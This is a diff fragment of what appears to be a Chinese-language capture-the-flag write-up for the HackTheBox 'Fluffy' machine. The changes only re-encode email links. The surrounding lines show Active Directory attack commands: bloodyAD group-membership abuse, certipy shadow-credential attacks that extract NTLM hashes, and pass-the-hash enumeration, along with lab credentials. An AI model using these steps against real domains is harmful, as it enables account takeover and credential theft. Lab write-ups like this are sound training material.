@@ -155,10 +155,10 @@
 <p>└─# bloodyAD -d fluffy.htb -u p.agila -p ‘prometheusx-303’ –dc-ip 10.10.11.69 add groupMember ‘SERVICE ACCOUNTS’ p.agila</p>
 <p>[+] p.agila added to SERVICE ACCOUNTS  成功添加</p>
 <p>获得winrm用户的hash</p>
-<p>certipy-ad shadow auto -u ‘<a href="mailto:&#x70;&#x2e;&#97;&#x67;&#105;&#x6c;&#x61;&#x40;&#x66;&#108;&#x75;&#x66;&#x66;&#121;&#46;&#104;&#116;&#98;">p.agila@fluffy.htb</a>‘ -p ‘prometheusx-303’ -account ‘winrm_svc’ -target dc01.fluffy.htb -dc-ip 10.10.11.69</p>
+<p>certipy-ad shadow auto -u ‘<a href="mailto:&#x70;&#x2e;&#97;&#x67;&#x69;&#108;&#97;&#64;&#x66;&#108;&#117;&#102;&#x66;&#x79;&#46;&#x68;&#116;&#x62;">p.agila@fluffy.htb</a>‘ -p ‘prometheusx-303’ -account ‘winrm_svc’ -target dc01.fluffy.htb -dc-ip 10.10.11.69</p>
 <p><img src="/../images/flu/win.png" alt="1"></p>
 <p>使用evil登录获得user.flag</p>
-<p>获取ca_svc用户 NTLM hash<br>certipy-ad shadow auto -u ‘<a href="mailto:&#x70;&#46;&#97;&#103;&#105;&#108;&#97;&#x40;&#102;&#x6c;&#x75;&#x66;&#102;&#121;&#x2e;&#104;&#116;&#x62;">p.agila@fluffy.htb</a>‘ -p ‘prometheusx-303’ -account ‘ca_svc’ -target dc01.fluffy.htb -dc-ip 10.10.11.69</p>
+<p>获取ca_svc用户 NTLM hash<br>certipy-ad shadow auto -u ‘<a href="mailto:&#x70;&#x2e;&#97;&#103;&#105;&#x6c;&#97;&#x40;&#102;&#108;&#117;&#102;&#102;&#121;&#46;&#x68;&#x74;&#x62;">p.agila@fluffy.htb</a>‘ -p ‘prometheusx-303’ -account ‘ca_svc’ -target dc01.fluffy.htb -dc-ip 10.10.11.69</p>
 <p><img src="/../images/flu/ca.png" alt="1"></p>
 <p>执行下面寻找有无漏洞命令提示不存在模板需要更新下需要更新版本</p>
 <p>certipy-ad find -username ca_svc -hashes :ca0f4f9e9eb8a092addf53bb03fc98c8 -dc-ip 10.10.11.69 -vulnerable</p>
